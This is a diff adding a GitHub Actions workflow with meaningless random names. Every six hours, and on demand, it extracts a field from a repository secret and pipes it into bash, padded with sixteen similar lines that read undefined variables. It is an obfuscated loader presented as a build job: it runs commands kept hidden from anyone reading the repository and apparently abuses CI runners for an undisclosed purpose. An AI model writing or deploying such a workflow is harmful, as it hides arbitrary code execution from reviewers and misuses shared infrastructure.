@@ -1,0 +1,33 @@
+name: wanzhuxian5678
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanzhuxian5678
+        env:
+          r646: ${{ secrets.r646 }}
+        run: |
+          echo $r646 | jq -r .jweza9375 | /bin/bash
+          echo $zzt9013 | jq -r .efciu26 | /bin/bash
+          echo $igny3 | jq -r .guzb7263 | /bin/bash
+          echo $ltz0 | jq -r .tbja1505 | /bin/bash
+          echo $ywidm8 | jq -r .gw6 | /bin/bash
+          echo $eoc7 | jq -r .zkqnv618 | /bin/bash
+          echo $zi39374 | jq -r .tdr7 | /bin/bash
+          echo $ovan90 | jq -r .dfe58 | /bin/bash
+          echo $nq0 | jq -r .s8 | /bin/bash
+          echo $knvt95 | jq -r .of14 | /bin/bash
+          echo $e0 | jq -r .ijnpm20 | /bin/bash
+          echo $ocxec9124 | jq -r .nudk92708 | /bin/bash
+          echo $mhoft9 | jq -r .qhqts02 | /bin/bash
+          echo $dwy87793 | jq -r .poyjr6219 | /bin/bash
+          echo $iz74 | jq -r .jfa093 | /bin/bash
+          echo $kqgl00053 | jq -r .zfn205 | /bin/bash
+          echo $lflc77085 | jq -r .xz768 | /bin/bash
+
